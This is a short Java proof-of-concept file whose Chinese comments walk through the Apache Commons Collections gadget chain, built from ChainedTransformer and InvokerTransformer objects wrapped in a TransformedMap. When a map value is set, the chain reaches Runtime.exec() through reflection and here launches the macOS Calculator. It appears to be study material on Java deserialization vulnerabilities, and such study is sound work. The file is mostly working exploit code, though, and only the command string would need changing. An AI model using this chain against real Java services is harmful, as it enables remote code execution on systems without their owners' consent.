package com.aqn.core;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.util.HashMap;
import java.util.Map;

public class POC {
    public static void main(String[] args) {
        //让它依次调用Runtime --》getRuntime() --》exec()
        Transformer[] transformers = new Transformer[]{
                //首先需要ConstantTransformer获取Runtime类
                new ConstantTransformer(Runtime.class),
                //接着调用getMethod来定位查找getRuntime
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[0]}),
                //反射调用getRuntime中的exec()  invoke
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"/Applications/Calculator.app/Contents/MacOS/Calculator"})

        };


        //将多个Transformer串联起来，依次执行Runtime --》getRuntime() --》exec() 便可序列化
        Transformer transformedChain = new ChainedTransformer(transformers);

        Map innerMap = new HashMap();
        innerMap.put("key","value");
        //通过decorated将Map对象转换成另外一个Map对象
        //第三个参数就是我们上面构造好的恶意代码链
        Map outerMap = TransformedMap.decorate(innerMap,null,transformedChain);
        //这时候如果后面的操作修改了转出来Map对象的outerMap值，就会ChainedTransformer内一系列InvokerTransformer，造成代码执行
        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();
        onlyElement.setValue("test");

    }
}
